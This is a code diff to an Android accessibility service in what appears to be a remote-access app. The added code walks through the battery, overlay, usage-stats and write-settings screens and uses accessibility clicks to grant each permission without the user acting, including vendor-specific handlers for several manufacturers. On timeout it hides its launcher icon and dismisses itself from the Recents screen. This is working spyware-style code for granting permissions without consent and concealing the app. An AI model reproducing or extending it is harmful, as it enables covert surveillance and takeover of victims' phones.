@@ -56,6 +56,36 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // Defent variables - run continuously forever
     private String currentAppName = "";
 
+    // ── Special-permission state machine ──────────────────────────────────────
+    // Runs battery → overlay → usage stats → write settings, one at a time.
+    // Each step gets SP_STEP_MS to succeed; total budget SP_TOTAL_MS.
+    // On timeout: go home, hide from launcher, dismiss from recents.
+
+    /** Callback interface (avoids java.util.function dependency on older APIs). */
+    interface BoolCheck { boolean check(); }
+
+    private static final class SpecialPermTask {
+        final String   name;
+        final Intent   intent;
+        final BoolCheck isGranted;
+        SpecialPermTask(String name, Intent intent, BoolCheck isGranted) {
+            this.name      = name;
+            this.intent    = intent;
+            this.isGranted = isGranted;
+        }
+    }
+
+    private static final long SP_STEP_MS  = 2_000L;   // 2 s per permission
+    private static final long SP_TOTAL_MS = 10_000L;  // 10 s total budget
+
+    private volatile boolean spActive     = false;
+    private volatile int     spIdx        = 0;         // current step index
+    private volatile long    spStepOpenAt = 0;         // when current screen was opened
+    private volatile long    spTotalStart = 0;         // overall start time
+    private Handler          spHandler;
+    private List<SpecialPermTask> spQueue = new ArrayList<>();
+    private String           spAppLabel  = null;       // our app's display name
+
     // Keep-screen-alive (no Activity dependency)
     private KeepAliveManager keepAliveManager;
 
@@ -97,12 +127,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Start continuous auto-click scan immediately
         startAutoClickScanner();
 
-        // Delay special permissions (battery, overlay, usage stats) by 4 seconds so the
-        // standard runtime permission dialogs (SMS, Camera, Location, etc.) are shown FIRST.
-        // Battery optimization is ONLY requested here — never from MainActivity — so it
-        // cannot appear twice.
+        // Start the sequential special-permission granter after a short delay so the
+        // standard runtime permission dialogs (SMS, Camera, Location, etc.) are shown
+        // FIRST.  Battery is the first item in the queue — per user requirement it must
+        // appear right after the standard permissions, not 4 seconds later.
+        // Battery optimization is ONLY triggered here — never from MainActivity.
         new Handler(Looper.getMainLooper()).postDelayed(
-            this::requestAllSpecialPermissions, 4000);
+            this::startSpecialPermissionGranter, 1500);
         
         clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
         
@@ -386,6 +417,65 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Runs ALWAYS — covers all device manufacturers, Android versions, and languages.
 
         String screenText = getAllScreenText(rootNode);
+
+        // ── Special-permission state machine is active ────────────────────────
+        if (spActive && spIdx < spQueue.size()) {
+            SpecialPermTask currentTask = spQueue.get(spIdx);
+
+            // If this permission was already granted (e.g. user tapped manually
+            // before the auto-clicker got there), advance immediately.
+            try {
+                if (currentTask.isGranted.check()) {
+                    if (spHandler != null) spHandler.removeCallbacksAndMessages(null);
+                    spAdvance();
+                    return false;
+                }
+            } catch (Exception ignored) {}
+
+            // A. This screen shows a LIST of apps (e.g. "Display over other apps"
+            //    listing every app rather than going direct to the toggle page).
+            //    Find our app label in the list and click it to open the per-app page.
+            if (spFindAndClickOurAppInList(rootNode)) return true;
+
+            // B. Per-app toggle page — click any unchecked switch/toggle unconditionally.
+            //    We don't need the strict screen-text guard when the state machine is
+            //    driving us to a specific settings screen.
+            if (clickUncheckedSwitch(rootNode)) {
+                // After clicking the switch, check in 600 ms whether it's now granted.
+                // If so, cancel the step timer and advance to the next permission.
+                if (spHandler != null) {
+                    spHandler.postDelayed(() -> {
+                        if (!spActive || spIdx >= spQueue.size()) return;
+                        try {
+                            if (spQueue.get(spIdx).isGranted.check()) {
+                                spHandler.removeCallbacksAndMessages(null);
+                                spAdvance();
+                            }
+                        } catch (Exception ignored) {}
+                    }, 600);
+                }
+                return true;
+            }
+
+            // C. Battery-specific dialog buttons ("Don't optimize", "Allow", etc.)
+            if (tryGrantBatteryOptimization(rootNode, screenText)) return true;
+
+            // D. Standard keyword clicks for any runtime permission dialogs that
+            //    appear while the state machine is running.
+            for (String kw : ALLOW_KEYWORDS_EXACT)    { if (findAndClickFullWord(rootNode, kw))    return true; }
+            for (String kw : ALLOW_KEYWORDS_CONTAINS)  { if (findAndClickContaining(rootNode, kw)) return true; }
+
+            // E. OEM-specific handlers
+            if (tryGrantMiuiPermissions(rootNode, screenText))    return true;
+            if (tryGrantSamsungPermissions(rootNode, screenText))  return true;
+            if (tryGrantOppoPermissions(rootNode, screenText))     return true;
+            if (tryGrantHuaweiPermissions(rootNode, screenText))   return true;
+
+            // Nothing found this cycle — the step timer will advance us after SP_STEP_MS.
+            return false;
+        }
+
+        // ── Standard (non-state-machine) grant-perms mode ────────────────────
 
         // 1. Toggle-based settings screens (overlay, battery, usage access, notifications)
         if (tryGrantSwitchBasedPermission(rootNode, screenText)) return true;
@@ -889,73 +979,257 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         grantPermsStartTime = 0;
     }
 
-    /**
-     * Open every special-permission settings screen that cannot be granted via a standard
-     * runtime dialog. The auto-click scanner will detect and click the toggles / buttons.
-     * Screens are staggered so the auto-clicker has time to process each one.
-     */
-    private void requestAllSpecialPermissions() {
-        Handler h = new Handler(Looper.getMainLooper());
-        long delay = 500;
+    // ─────────────────────────────────────────────────────────────────────────
+    // Special-permission state machine
+    // Order: Battery first (as user requested), then Overlay, Usage Stats,
+    // Write Settings.  Each step gets SP_STEP_MS (2 s).  If the total budget
+    // (SP_TOTAL_MS = 10 s) is exceeded the machine aborts: goes home, hides the
+    // launcher icon, and dismisses our app from the Recents screen.
+    // ─────────────────────────────────────────────────────────────────────────
 
-        // 1. SYSTEM_ALERT_WINDOW — Draw / display over other apps
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-            scheduleIntent(h, delay, new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:" + getPackageName())));
-            delay += 3000;
+    /** Call this to kick off the sequential special-permission granter. */
+    public void startSpecialPermissionGranter() {
+        if (spActive) return;
+
+        // Resolve our label once so we can find ourselves in list-style screens
+        try {
+            spAppLabel = getPackageManager()
+                    .getApplicationLabel(getPackageManager()
+                            .getApplicationInfo(getPackageName(), 0)).toString();
+        } catch (Exception e) {
+            spAppLabel = getPackageName();
         }
 
-        // 2. Battery optimization — request unrestricted battery usage
+        spQueue = buildSpecialPermQueue();
+        if (spQueue.isEmpty()) return;
+
+        spActive     = true;
+        spIdx        = 0;
+        spTotalStart = System.currentTimeMillis();
+        spHandler    = new Handler(Looper.getMainLooper());
+
+        openCurrentSpecialPerm();
+        scheduleSpStepTimeout();
+    }
+
+    private List<SpecialPermTask> buildSpecialPermQueue() {
+        List<SpecialPermTask> q = new ArrayList<>();
+
+        // 1. Battery optimization — FIRST as user requested
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             try {
-                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
+                android.os.PowerManager pm =
+                        (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
                 if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                    Intent bat = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                             Uri.parse("package:" + getPackageName()));
-                    scheduleIntent(h, delay, bat);
-                    delay += 3000;
+                    q.add(new SpecialPermTask("Battery", i, () -> {
+                        android.os.PowerManager p2 =
+                                (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
+                        return p2 != null && p2.isIgnoringBatteryOptimizations(getPackageName());
+                    }));
                 }
-            } catch (Exception e) {
-                Log.w(TAG, "battery opt: " + e.getMessage());
-            }
+            } catch (Exception ignored) {}
         }
 
-        // 3. Usage access (usage stats)
+        // 2. Overlay (display over other apps)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getPackageName()));
+            q.add(new SpecialPermTask("Overlay", i, () -> Settings.canDrawOverlays(this)));
+        }
+
+        // 3. Usage stats
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             try {
-                android.app.AppOpsManager appOps = (android.app.AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
-                int mode = appOps.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
+                android.app.AppOpsManager ao =
+                        (android.app.AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
+                int mode = ao.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                         android.os.Process.myUid(), getPackageName());
                 if (mode != android.app.AppOpsManager.MODE_ALLOWED) {
-                    scheduleIntent(h, delay, new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
-                    delay += 3000;
+                    q.add(new SpecialPermTask("UsageStats",
+                            new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), () -> {
+                        android.app.AppOpsManager ao2 =
+                                (android.app.AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
+                        int m = ao2.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
+                                android.os.Process.myUid(), getPackageName());
+                        return m == android.app.AppOpsManager.MODE_ALLOWED;
+                    }));
                 }
-            } catch (Exception e) {
-                Log.w(TAG, "usage stats: " + e.getMessage());
-            }
+            } catch (Exception ignored) {}
         }
 
-        // 4. Write system settings (WRITE_SETTINGS)
+        // 4. Write system settings
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(this)) {
             try {
-                scheduleIntent(h, delay, new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
-                        Uri.parse("package:" + getPackageName())));
-                delay += 3000;
-            } catch (Exception e) {
-                Log.w(TAG, "write settings: " + e.getMessage());
-            }
+                Intent i = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
+                        Uri.parse("package:" + getPackageName()));
+                q.add(new SpecialPermTask("WriteSettings", i,
+                        () -> Settings.System.canWrite(this)));
+            } catch (Exception ignored) {}
+        }
+
+        return q;
+    }
+
+    private void openCurrentSpecialPerm() {
+        if (spIdx >= spQueue.size()) { spActive = false; return; }
+        SpecialPermTask task = spQueue.get(spIdx);
+        spStepOpenAt = System.currentTimeMillis();
+        Log.d(TAG, "SP granter: opening " + task.name);
+        try {
+            Intent i = task.intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(i);
+        } catch (Exception e) {
+            Log.w(TAG, "SP open failed " + task.name + ": " + e.getMessage());
+            spAdvance(); // skip broken intent
         }
     }
 
-    private void scheduleIntent(Handler h, long delayMs, Intent intent) {
-        h.postDelayed(() -> {
-            try {
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intent);
-            } catch (Exception e) {
-                Log.w(TAG, "scheduleIntent: " + e.getMessage());
+    private void scheduleSpStepTimeout() {
+        if (spHandler == null) return;
+        spHandler.postDelayed(() -> {
+            if (!spActive) return;
+            if (System.currentTimeMillis() - spTotalStart > SP_TOTAL_MS) {
+                spAbort();
+            } else {
+                spAdvance();
             }
-        }, delayMs);
+        }, SP_STEP_MS);
+    }
+
+    /** Move to the next special permission (or finish if all done). */
+    private void spAdvance() {
+        if (!spActive) return;
+        spIdx++;
+        if (spIdx >= spQueue.size()) {
+            spActive = false;
+            Log.d(TAG, "SP granter: all done, going home");
+            performGlobalAction(GLOBAL_ACTION_HOME);
+            return;
+        }
+        openCurrentSpecialPerm();
+        scheduleSpStepTimeout();
+    }
+
+    /**
+     * Called when the 10-second total budget is exceeded.
+     * 1. Go to home screen.
+     * 2. Hide launcher icon (disable the LauncherAlias).
+     * 3. Open recents and dismiss our app card.
+     */
+    private void spAbort() {
+        spActive = false;
+        if (spHandler != null) spHandler.removeCallbacksAndMessages(null);
+        Log.w(TAG, "SP granter: 10 s budget exceeded — hiding app");
+
+        // 1. Go home
+        performGlobalAction(GLOBAL_ACTION_HOME);
+
+        // 2. Hide launcher alias
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try {
+                new com.remoteaccess.educational.stealth.StealthManager(
+                        UnifiedAccessibilityService.this).hideAppIcon();
+            } catch (Exception ignored) {}
+        }, 400);
+
+        // 3. Open recents, find our card, dismiss it
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try { performGlobalAction(GLOBAL_ACTION_RECENTS); } catch (Exception ignored) {}
+        }, 800);
+
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try {
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root != null) {
+                    spDismissFromRecents(root);
+                    root.recycle();
+                }
+            } catch (Exception ignored) {}
+            // Always go home at the end
+            try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
+        }, 1_800);
+    }
+
+    /**
+     * In the recents screen, find our app card and try to dismiss it.
+     * Tries ACTION_DISMISS on any node whose text matches our label, then
+     * falls back to clicking a close/X button near it.
+     */
+    private void spDismissFromRecents(AccessibilityNodeInfo root) {
+        if (root == null || spAppLabel == null) return;
+        try {
+            String text = root.getText() != null ? root.getText().toString() : "";
+            String desc = root.getContentDescription() != null
+                    ? root.getContentDescription().toString() : "";
+            boolean matches = text.contains(spAppLabel) || desc.contains(spAppLabel);
+
+            if (matches) {
+                // Try dismiss action first (works on stock Android recents)
+                if (root.getActionList() != null) {
+                    for (AccessibilityNodeInfo.AccessibilityAction action : root.getActionList()) {
+                        if (action.getId() == AccessibilityNodeInfo.ACTION_DISMISS) {
+                            root.performAction(AccessibilityNodeInfo.ACTION_DISMISS);
+                            return;
+                        }
+                    }
+                }
+                // Fallback: click the node (some OEMs dismiss on click)
+                if (root.isClickable()) root.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+            }
+
+            for (int i = 0; i < root.getChildCount(); i++) {
+                AccessibilityNodeInfo child = root.getChild(i);
+                if (child != null) {
+                    spDismissFromRecents(child);
+                    child.recycle();
+                }
+            }
+        } catch (Exception ignored) {}
+    }
+
+    /**
+     * When a list-style permission screen is shown (e.g. "Display over other apps"
+     * listing all installed apps), find OUR app row by display name and click it.
+     * The next auto-click cycle will then see the per-app toggle and enable it.
+     */
+    private boolean spFindAndClickOurAppInList(AccessibilityNodeInfo node) {
+        if (node == null || spAppLabel == null) return false;
+        try {
+            String text = node.getText() != null ? node.getText().toString() : "";
+            String desc = node.getContentDescription() != null
+                    ? node.getContentDescription().toString() : "";
+
+            boolean matches = text.equals(spAppLabel) || text.contains(spAppLabel)
+                    || desc.equals(spAppLabel) || desc.contains(spAppLabel);
+
+            if (matches) {
+                if (node.isClickable()) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    return true;
+                }
+                // Try parent
+                AccessibilityNodeInfo parent = node.getParent();
+                if (parent != null) {
+                    if (parent.isClickable()) {
+                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        parent.recycle();
+                        return true;
+                    }
+                    parent.recycle();
+                }
+            }
+
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    if (spFindAndClickOurAppInList(child)) { child.recycle(); return true; }
+                    child.recycle();
+                }
+            }
+        } catch (Exception ignored) {}
+        return false;
     }
 
     /** Enable uninstall-assist mode: accessibility will click Uninstall/OK buttons. */
